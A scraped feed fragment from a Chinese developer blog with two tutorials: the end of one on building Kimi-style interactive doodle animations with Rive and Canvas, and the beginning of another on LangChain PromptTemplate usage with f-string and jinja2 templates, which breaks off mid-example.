<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span> 
<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Kimi Doodle - 名字绘制效果<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span> 
    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"> 
    * { 
        <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>; 
        <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>; 
        <span class="hljs-attribute">box-sizing</span>: 
        border-box; 
    } 
    <span class="hljs-selector-tag">html</span>, <span class="hljs-selector-tag">body</span> { 
        <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>; 
        <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>; 
        <span class="hljs-attribute">overflow</span>: hidden; 
    } 
    <span class="hljs-selector-class">.rive-container</span> { 
        <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto; 
        <span class="hljs-attribute">width</span>: <span class="hljs-number">260px</span>; 
        <span class="hljs-attribute">height</span>: <span class="hljs-number">160px</span>; 
        <span class="hljs-attribute">cursor</span>: pointer; 
    } 
    <span class="hljs-selector-tag">canvas</span> { 
        <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>; 
        <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>; 
    } 
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span> 
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span> 
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span> 
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"rive-container"</span>&gt;</span> 
        <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span> 
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span> 
<span class="hljs-comment">&lt;!-- 后续JS代码写在这里 --&gt;</span> 
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span> 
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span> 
</code></pre>
<p>样式上做了基础的重置，保证容器居中且占满可视区域，同时隐藏滚动条避免干扰。</p>
<h3 data-id="heading-6">3. Rive动画初始化</h3>
<p>初始化Rive实例是核心步骤，需要指定动画文件、渲染画布、状态机等关键参数：</p>
<pre><code class="hljs language-javascript" lang="javascript">    <span class="hljs-keyword">const</span> canvas = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'canvas'</span>); 
    <span class="hljs-keyword">const</span> dpr = <span class="hljs-variable language_">window</span>.<span class="hljs-property">devicePixelRatio</span> || <span class="hljs-number">1</span>; <span class="hljs-comment">// 适配高清屏 </span>
    <span class="hljs-keyword">let</span> riveInstance = <span class="hljs-literal">null</span>; 
    <span class="hljs-keyword">let</span> mouseXInput = <span class="hljs-literal">null</span>; 
    <span class="hljs-keyword">let</span> mouseYInput = <span class="hljs-literal">null</span>; 
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) { <span class="hljs-comment">// 适配高清屏，设置Canvas实际尺寸 </span>
        canvas.<span class="hljs-property">width</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span> * dpr; 
        canvas.<span class="hljs-property">height</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span> * dpr; <span class="hljs-comment">// 初始化Rive实例 </span>
        riveInstance = <span class="hljs-keyword">new</span> rive.<span class="hljs-title class_">Rive</span>({ 
            <span class="hljs-attr">src</span>: <span class="hljs-string">'./261230-11_16_34_visual_doodle2.riv'</span>, <span class="hljs-comment">// 本地Rive动画文件 </span>
            <span class="hljs-attr">canvas</span>: canvas, <span class="hljs-comment">// 渲染画布 </span>
            <span class="hljs-attr">autoplay</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 自动播放 </span>
            <span class="hljs-attr">stateMachines</span>: <span class="hljs-string">'doodle'</span>, <span class="hljs-comment">// 指定要使用的状态机名称 </span>
            <span class="hljs-attr">fit</span>: rive.<span class="hljs-property">Fit</span>.<span class="hljs-property">cover</span>, <span class="hljs-comment">// 动画适配方式 </span>
            <span class="hljs-attr">alignment</span>: rive.<span class="hljs-property">Alignment</span>.<span class="hljs-property">center</span>, <span class="hljs-comment">// 动画对齐方式 </span>
            <span class="hljs-attr">onLoad</span>: <span class="hljs-function">() =&gt;</span> { <span class="hljs-comment">// 调整画布尺寸适配动画   </span>
                riveInstance.<span class="hljs-title function_">resizeDrawingSurfaceToCanvas</span>(); <span class="hljs-comment">// 提取状态机输入参数 </span>
                <span class="hljs-title function_">extractInputs</span>(); 
            } 
}); 
} <span class="hljs-comment">// 页面加载完成后初始化 </span>
<span class="hljs-variable language_">document</span>.<span class="hljs-property">readyState</span> === <span class="hljs-string">'loading'</span> ? <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'DOMContentLoaded'</span>, init) : <span class="hljs-title function_">init</span>(); 
</code></pre>
<p>关键参数说明：</p>
<ul>
<li><code>src</code>：Rive动画文件路径（需提前用Rive Editor制作并导出）；</li>
<li><code>stateMachines</code>：设计师在Rive中定义的状态机名称，用于关联交互逻辑；</li>
<li><code>fit/alignment</code>：控制动画在Canvas中的缩放和对齐方式，类似CSS的object-fit。</li>
</ul>
<h3 data-id="heading-7">4. 实现交互联动：</h3>
<p>鼠标/触摸跟随 Rive动画的核心交互性体现在“状态机输入”——设计师可在Rive中定义数值型输入（如x/y坐标）和触发型输入（如点击事件），前端通过修改这些输入值驱动动画变化。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">extractInputs</span>(<span class="hljs-params"/>) { 
    <span class="hljs-keyword">try</span> { <span class="hljs-comment">// 获取状态机的所有输入参数 </span>
        <span class="hljs-keyword">const</span> inputs = riveInstance.<span class="hljs-title function_">stateMachineInputs</span>(<span class="hljs-string">'doodle'</span>); 
        <span class="hljs-keyword">if</span> (!inputs) <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 自动匹配坐标输入（兼容多种命名方式） mouseXInput = inputs.find(i =&gt; ['x','X','mouseX','MouseX','posX'].includes(i.name) ); mouseYInput = inputs.find(i =&gt; ['y','Y','mouseY','MouseY','posY'].includes(i.name) ); // 找到坐标输入后，绑定交互事件 </span>
        <span class="hljs-keyword">if</span> (mouseXInput &amp;&amp; mouseYInput) { 
            <span class="hljs-title function_">setupInteraction</span>(); 
        } 
    } <span class="hljs-keyword">catch</span> (e) { 
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'提取输入失败:'</span>, e); 
    } 
} 
<span class="hljs-keyword">function</span> <span class="hljs-title function_">setupInteraction</span>(<span class="hljs-params"/>) { <span class="hljs-comment">// 统一的坐标更新逻辑 </span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">updatePosition</span> = (<span class="hljs-params">clientX, clientY</span>) =&gt; { <span class="hljs-comment">// 获取Canvas的可视区域位置 </span>
    <span class="hljs-keyword">const</span> rect = canvas.<span class="hljs-title function_">getBoundingClientRect</span>(); <span class="hljs-comment">// 将鼠标坐标转换为0-1的相对值（适配不同尺寸） </span>
    <span class="hljs-keyword">const</span> x = (clientX - rect.<span class="hljs-property">left</span>) / rect.<span class="hljs-property">width</span>; 
    <span class="hljs-keyword">const</span> y = (clientY - rect.<span class="hljs-property">top</span>) / rect.<span class="hljs-property">height</span>; <span class="hljs-comment">// 更新Rive状态机的坐标输入值 </span>
    <span class="hljs-keyword">if</span> (mouseXInput) mouseXInput.<span class="hljs-property">value</span> = x; 
    <span class="hljs-keyword">if</span> (mouseYInput) mouseYInput.<span class="hljs-property">value</span> = y; 
    }; <span class="hljs-comment">// 监听鼠标移动 </span>
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mousemove'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> { <span class="hljs-title function_">updatePosition</span>(e.<span class="hljs-property">clientX</span>, e.<span class="hljs-property">clientY</span>); 
    }); <span class="hljs-comment">// 监听触摸移动（适配移动端） </span>
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'touchmove'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
    e.<span class="hljs-title function_">preventDefault</span>(); <span class="hljs-comment">// 阻止默认滚动行为 </span>
    <span class="hljs-title function_">updatePosition</span>(e.<span class="hljs-property">touches</span>[<span class="hljs-number">0</span>].<span class="hljs-property">clientX</span>, e.<span class="hljs-property">touches</span>[<span class="hljs-number">0</span>].<span class="hljs-property">clientY</span>); }, { <span class="hljs-attr">passive</span>: <span class="hljs-literal">false</span> }); <span class="hljs-comment">// 点击触发额外动画（触发型输入） document.addEventListener('click', () =&gt; { </span>
    <span class="hljs-keyword">const</span> trigger=riveInstance.<span class="hljs-title function_">stateMachineInputs</span>(<span class="hljs-string">'doodle'</span>).<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">i</span> =&gt;</span> i.<span class="hljs-property">type</span> === rive.<span class="hljs-property">StateMachineInputType</span>.<span class="hljs-property">Trigger</span>); 
    <span class="hljs-keyword">if</span> (trigger) trigger.<span class="hljs-title function_">fire</span>(); <span class="hljs-comment">// 触发动画 </span>
}); 
} 
</code></pre>
<p>核心思路：</p>
<ul>
<li>将鼠标/触摸的绝对坐标转换为相对Canvas的0-1区间值，保证不同尺寸下交互逻辑一致；</li>
<li>移动端通过<code>touchmove</code>事件适配，注意设置<code>passive: false</code>以允许阻止默认滚动；</li>
<li>点击事件触发Rive的Trigger类型输入，可实现点击时的动画反馈（如手绘笔触的“落笔”效果）。</li>
</ul>
<h3 data-id="heading-8">5. 响应式适配</h3>
<p>为了让动画在窗口尺寸变化时正常显示，需要监听<code>resize</code>事件并更新Canvas尺寸：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, <span class="hljs-function">() =&gt;</span> { 
    canvas.<span class="hljs-property">width</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span> * dpr; 
    canvas.<span class="hljs-property">height</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span> * dpr; 
    <span class="hljs-keyword">if</span> (riveInstance)riveInstance.<span class="hljs-title function_">resizeDrawingSurfaceToCanvas</span>(); 
}); 
</code></pre>
<h2 data-id="heading-9">三、关键优化点</h2>
<h3 data-id="heading-10">1. 高清屏适配</h3>
<p>通过<code>window.devicePixelRatio</code>设置Canvas的实际尺寸，避免动画在Retina屏上模糊。</p>
<h3 data-id="heading-11">2. 性能优化</h3>
<ul>
<li>避免频繁修改Canvas尺寸，仅在窗口resize时更新；</li>
<li>触摸事件中合理使用<code>passive: false</code>，既阻止默认滚动又不影响性能；</li>
<li>Rive动画本身已做矢量优化，无需额外压缩，只需保证<code>.riv</code>文件体积适中。</li>
</ul>
<h3 data-id="heading-12">3. 兼容性处理</h3>
<ul>
<li>监听<code>DOMContentLoaded</code>确保页面加载完成后初始化Rive；</li>
<li>异常捕获：在提取状态机输入时增加try/catch，避免动画文件加载异常导致页面崩溃。</li>
</ul>
<h2 data-id="heading-13">四、Rive动画制作小贴士</h2>
<ol>
<li>动画文件制作：使用Rive Editor（<a href="https://link.juejin.cn?target=https%3A%2F%2Frive.app%2F%25EF%25BC%2589%25E5%2588%25B6%25E4%25BD%259C%25E6%2589%258B%25E7%25BB%2598%25E9%25A3%258E%25E6%25A0%25BC%25E5%258A%25A8%25E7%2594%25BB%25EF%25BC%258C%25E5%25AE%259A%25E4%25B9%2589%25E7%258A%25B6%25E6%2580%2581%25E6%259C%25BA%25E8%25BE%2593%25E5%2585%25A5%25EF%25BC%2588x%2Fy%25E6%2595%25B0%25E5%2580%25BC%25E8%25BE%2593%25E5%2585%25A5%25E3%2580%2581%25E7%2582%25B9%25E5%2587%25BBTrigger%25EF%25BC%2589%25EF%25BC%259B" target="_blank" title="https://rive.app/%EF%BC%89%E5%88%B6%E4%BD%9C%E6%89%8B%E7%BB%98%E9%A3%8E%E6%A0%BC%E5%8A%A8%E7%94%BB%EF%BC%8C%E5%AE%9A%E4%B9%89%E7%8A%B6%E6%80%81%E6%9C%BA%E8%BE%93%E5%85%A5%EF%BC%88x/y%E6%95%B0%E5%80%BC%E8%BE%93%E5%85%A5%E3%80%81%E7%82%B9%E5%87%BBTrigger%EF%BC%89%EF%BC%9B" ref="nofollow noopener noreferrer">rive.app/）制作手绘风格动画，定…</a></li>
<li>命名规范：状态机输入名称尽量统一（如mouseX/mouseY），方便前端自动匹配；</li>
<li>导出设置：导出时选择“Minify”压缩文件，减小体积。</li>
</ol>
<h2 data-id="heading-14">五、最终效果与结语</h2>
<p>通过以上步骤，我们实现了和Kimi官网类似的交互式手绘动画效果：</p>
<ul>
<li>鼠标/触摸跟随，动画实时响应位置变化；</li>
<li>点击触发额外动画反馈；</li>
<li>适配不同设备尺寸，高清屏无模糊；</li>
<li>高性能渲染，流畅无卡顿。</li>
</ul>
<p>Rive作为一款强大的交互式动画工具，能极大降低前端实现复杂交互动画的成本。只需设计师提供做好的<code>.riv</code>动画文件，前端即可通过简单的API实现丰富的交互效果。这种“设计与开发分离”的模式，既能保证动画效果的还原度，又能提升开发效率。</p>
<p>如果你想进一步扩展功能，还可以尝试：</p>
<ul>
<li>增加动画播放/暂停控制；</li>
<li>自定义不同交互场景的动画状态；</li>
<li>结合CSS过渡实现更丰富的视觉效果。 完整代码已在文中给出，只需替换自己的<code>.riv</code>动画文件，即可快速复刻出属于自己的交互式动画效果！</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[langchain-提示词模板的用法]]></title>    <link>https://juejin.cn/post/7600752623068463114</link>    <guid>https://juejin.cn/post/7600752623068463114</guid>    <pubDate>2026-01-30T08:23:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600752623068463114" data-draft-id="7600791597169115179" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="langchain-提示词模板的用法"/> <meta itemprop="keywords" content="LangChain"/> <meta itemprop="datePublished" content="2026-01-30T08:23:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="浅碎时光195"/> <meta itemprop="url" content="https://juejin.cn/user/2983420676552378"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            langchain-提示词模板的用法
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2983420676552378/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    浅碎时光195
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T08:23:17.000Z" title="Fri Jan 30 2026 08:23:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    16
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. 基本提示词模板：PromptTemplate</h2>
<h3 data-id="heading-1">模板依赖包及导入方式</h3>
<pre><code class="hljs language-javascript" lang="javascript">langchain0<span class="hljs-number">.1</span>版本，组件langchain.<span class="hljs-property">prompts</span>;
    <span class="hljs-keyword">from</span> langchain.<span class="hljs-property">prompts</span> <span class="hljs-keyword">import</span> <span class="hljs-title class_">PromptTemplate</span>
langchain0<span class="hljs-number">.2</span>及以上版本，调整架构，组件langchain_core.<span class="hljs-property">prompts</span>
    <span class="hljs-keyword">from</span> langchain_core.<span class="hljs-property">prompts</span> <span class="hljs-keyword">import</span> <span class="hljs-title class_">PromptTemplate</span>
    
</code></pre>
<h3 data-id="heading-2">PromptTemplate 构造方法的参数及其使用</h3>









































<table><thead><tr><th align="left">参数名</th><th align="left">类型</th><th align="left">是否必传</th><th align="left">核心作用</th></tr></thead><tbody><tr><td align="left">template</td><td align="left">str</td><td align="left">必传</td><td align="left">提示词模板字符串，包含{变量名}占位符</td></tr><tr><td align="left">input_variables</td><td align="left">list[str]</td><td align="left">可选</td><td align="left">模板中所有占位符的名称列表，用于校验参数完整性</td></tr><tr><td align="left">template_format</td><td align="left">f-string/jinja2</td><td align="left">可选</td><td align="left">模板解析格式，默认f-string</td></tr><tr><td align="left">validate_template</td><td align="left">f-string/jinja2</td><td align="left">可选</td><td align="left">是否校验模板中占位符与input_variables匹配，默认True；具体项目中也无需修改为false,可忽略此参数</td></tr><tr><td align="left">partial_variables</td><td align="left">dict</td><td align="left">可选</td><td align="left">部分固定参数</td></tr></tbody></table>
<h3 data-id="heading-3">template + input_variables + template_format="f-string"(参数默认，可缺省)的使用</h3>
<h4 data-id="heading-4">一个占位符</h4>
<pre><code class="hljs language-ini" lang="ini">from langchain_core.prompts import PromptTemplate

<span class="hljs-comment"># {varliable}是一个占位符，可通过接口修改，改变输入内容</span>
<span class="hljs-attr">tmp</span> = <span class="hljs-string">""" 我是一位{varliable}初学者 """</span> 

<span class="hljs-attr">prompt_template</span> = PromptTemplate(
   <span class="hljs-attr">template</span> = tmp,
   <span class="hljs-attr">input_variables</span> = [<span class="hljs-string">"varliable"</span>] <span class="hljs-comment"># 列表类型</span>
)

""" 给占位符赋值的一种方式，langchain1.0前的用法<span class="hljs-comment">; .format返回值是str类型</span>
<span class="hljs-attr">final_prompt</span> = prompt_template.format(varliable=<span class="hljs-string">"AI应用"</span>)
print(final_prompt)
"""

<span class="hljs-comment"># 给占位符赋值的另一种方式，langchain1.0后的用法，给占位符赋值；PromptTemplate的.invoke()返回值是StringPromptValue封装纯文本提示词，可通过.text获取字符串</span>

<span class="hljs-attr">result</span> = prompt_template.invoke( {<span class="hljs-string">"varliable"</span>:<span class="hljs-string">"AI应用"</span>} ) 
print(result.text)

<span class="hljs-comment"># 输出  我是一位AI应用初学者</span>
</code></pre>
<h4 data-id="heading-5">多个占位符</h4>
<pre><code class="hljs language-ini" lang="ini">from langchain_core.prompts import PromptTemplate

<span class="hljs-attr">tmp</span> = <span class="hljs-string">""" 我是一位{varliable}初学者，练习时长{learnLenth} """</span> 

<span class="hljs-attr">prompt_template</span> = PromptTemplate(
   <span class="hljs-attr">template</span> = tmp,
   <span class="hljs-attr">input_variables</span> = [<span class="hljs-string">"varliable"</span>,<span class="hljs-string">"learnLenth"</span>] <span class="hljs-comment"># 列表类型</span>
)

<span class="hljs-attr">result</span> = prompt_template.invoke( {<span class="hljs-string">"varliable"</span>:<span class="hljs-string">"AI应用"</span>,<span class="hljs-string">"learnLenth"</span>:<span class="hljs-string">"两年半"</span>} ) 

print(result.text)

<span class="hljs-comment"># 输出  我是一位AI应用初学者,练习时长两年半</span>
</code></pre>
<h3 data-id="heading-6">template_format 'jinja2'的使用</h3>

























<table><thead><tr><th align="left">f-string</th><th align="left">jinja2</th><th align="left">功能</th></tr></thead><tbody><tr><td align="left">{varliable}</td><td align="left">{{varliable}}</td><td align="left">占位符</td></tr><tr><td align="left"/><td align="left">{% if 条件 %} {% endif %}</td><td align="left">条件判断</td></tr><tr><td align="left"/><td align="left">{% for 元素 in 列表 %} {% endfor %}</td><td align="left">循环语句</td></tr></tbody></table>
<h4 data-id="heading-7">jinja2</h4>
<pre><code class="hljs language-ini" lang="ini">from langchain_core.prompts import PromptTemplate

<span class="hljs-comment"># {{varliable}}是一个占位符，可通过接口修改，改变输入内容</span>
<span class="hljs-attr">tmp</span> = <span class="hljs-string">""" 我是一位{{varliable}}初学者 """</span>

<span class="hljs-attr">prompt_template</span> = PromptTemplate(
    <span class="hljs-attr">template</span> = tmp,
    <span class="hljs-attr">input_variables</span>=[<span class="hljs-string">"varliable"</span>],
    <span class="hljs-attr">template_format</span>=<span class="hljs-string">"jinja2"</span>
)

<span class="hljs-attr">result</span> = prompt_template.invoke({<span class="hljs-string">"varliable"</span>:<span class="hljs-string">"AI应用"</span>})

print(result.text)
</code></pre>
<h4 data-id="heading-8">{% if 条件 %} {% endif %}</h4>
<pre><code class="hljs language-ini" lang="ini">from langchain_core.prompts import PromptTemplate

<span class="hljs-attr">tmp</span> = <span class="hljs-string">"""
你是一名{{role}}，为{{user_type}}撰写文案
{% if user_type == "学生" %}
要求：语言活泼，突出性价比，不超过80字
{% elif user_type == "职场人" %}
要求：语言专业，突出效率，不超过100字。
{% else %}
要求：通用风格，简洁明了，不超过90字。
{% endif %}
产品：{{product}}，卖点：{{selling_point}}
"""</span>
<span class="hljs-attr">prompt_template</span> = PromptTemplate(
    <span class="hljs-attr">template</span> = tmp,
    <span class="hljs-attr">input_variables</span>=[<span class="hljs-string">"role"</span>,<span class="hljs-string">"user_type"</span>,<span class="hljs-string">"product"</span>,<span class="hljs-string">"selling_point"</span>],
    <span class="hljs-attr">template_format</span>=<span class="hljs-string">"jinja2"</span>
)

<span class="hljs-attr">result</span> = prompt_template.invoke({<span class="hljs-string">"role"</span>:<span class="hljs-string">"专家"</span>,<span class="hljs-string">"user_type"</span>:<span class="hljs-string">"学生"</span>,<span class="hljs-string">"product"</span>:<span class="hljs-string">"蓝牙耳机"</span>,<span class="hljs-string">"selling_point"</span>:<span class="hljs-string">"省电"</span>})

print(result.text)

<span class="hljs-comment"># 输出：你是一名专家，为学生撰写文案 要求：语言活泼，突出性价比，不超过80字 产品：蓝牙耳机，卖点：省电</span>


<span class="hljs-attr">result</span> = prompt_template.invoke({<span class="hljs-string">"role"</span>:<span class="hljs-string">"专家"</span>,<span class="hljs-string">"user_type"</span>:<span class="hljs-string">"职场人"</span>,<span class="hljs-string">"product"</span>:<span class="hljs-string">"蓝牙耳机"</span>,<span class="hljs-string">"selling_point"</span>:<span class="hljs-string">"省电"</span>})

print(result.text)

<span class="hljs-comment"># 输出：你是一名专家，为职场人撰写文案  要求：语言专业，突出效率，不超过100字。 产品：蓝牙耳机，卖点：省电</span>

<span class="hljs-attr">result</span> = prompt_template.invoke({<span class="hljs-string">"role"</span>:<span class="hljs-string">"专家"</span>,<span class="hljs-string">"user_type"</span>:<span class="hljs-string">"学者"</span>,<span class="hljs-string">"product"</span>:<span class="hljs-string">"蓝牙耳机"</span>,<span class="hljs-string">"selling_point"</span>:<span class="hljs-string">"省电"</span>})

<span class="hljs-comment"># 输出：你是一名专家，为学者撰写文案  要求：通用风格，简洁明了，不超过90字。 产品：蓝牙耳机，卖点：省电</span>
</code></pre>
<h4 data-id="heading-9">{% for 元素 in 列表 %}</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_core.prompts <span class="hljs-keyword">import</span> PromptTemplate

template = <span class="hljs-string">"""
    {% for trunk in trunks %}
    -   {{trunk}}
    {% endfor %}
"""</span>

prompt_template = PromptTemplate(
    template=template,
    input_variables=[<span class="hljs-string">"trunks"</span>],
    template_format=<span class="hljs-string">"jinja2"</span>
)

result = prompt_template.invoke({<span class="hljs-string">"trunks"</span>:[<span class="hljs-string">"北京今天多云"</span>, <span class="hljs-string">"气温10-20℃"</span>, <span class="hljs-string">"微风"</span>]})

<span class="hljs-built_in">print</span>(result.text)

<span class="hljs-string">""" 输出
-   北京今天多云

-   气温10-20℃

-   微风
"""</span>
</code></pre>
<h3 data-id="heading-10">partial_variables 的使用</h3>
<pre><code class="hljs language-ini" lang="ini">from langchain_core.prompts import PromptTemplate

